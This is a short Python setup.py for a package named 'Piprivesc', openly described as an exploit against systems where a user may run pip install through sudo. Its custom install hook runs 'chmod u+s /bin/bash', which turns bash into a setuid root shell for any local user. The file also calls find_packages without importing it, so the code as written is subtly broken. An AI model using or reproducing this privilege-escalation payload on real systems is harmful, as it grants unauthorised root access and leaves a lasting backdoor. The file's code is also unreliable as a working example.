from setuptools import setup
from setuptools.command.install import install
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    os.system('chmod u+s /bin/bash')

setup(
    name='Piprivesc',
    version='0.0.1',
    description='This will exploit a sudoer able to /usr/bin/pip install *',
    author='bruno-1337',
    license='MIT',
    packages=find_packages(),
    cmdclass={
        'install' : CustomInstall
    },
)
